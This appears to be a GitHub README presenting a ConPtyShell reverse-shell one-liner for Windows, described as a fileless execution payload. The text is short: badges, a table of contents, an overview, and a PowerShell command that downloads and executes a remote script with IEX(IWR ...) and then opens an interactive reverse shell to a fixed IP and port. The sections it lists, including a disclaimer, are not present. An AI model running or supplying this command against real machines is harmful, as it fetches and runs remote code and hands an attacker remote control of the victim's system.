# 🐚 ConPtyShell One-Liner

<div align="center">

[![PowerShell](https://img.shields.io/badge/PowerShell-Core%20%2F%20Windows-blue.svg)](https://github.com/PowerShell/PowerShell)
[![Type](https://img.shields.io/badge/Type-Interactive%20Reverse%20Shell-red.svg)](https://github.com/antonioCoco/ConPtyShell)

*A powerful PowerShell-based interactive Pseudo Console (ConPTY) reverse shell payload for Windows.*

</div>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [The One-Liner](#-the-one-liner)
- [How It Works](#-how-it-works)
- [Prerequisites](#-prerequisites)
- [Usage](#-usage)
- [Disclaimer](#-disclaimer)

---

## 🚀 Overview

This repository features a quick fileless execution payload utilizing **ConPtyShell** (`Invoke-ConPtyShell.ps1`) by `antonioCoco`. Unlike basic reverse shells, ConPtyShell creates a fully interactive Windows Pseudo Console (ConPTY), providing a rich terminal experience (supporting command history, proper terminal resizing, and text formatting) over a netcat or custom listener.

---

## ⚡ The One-Liner

```powershell
IEX(IWR [https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1](https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell 192.168.178.118 33413
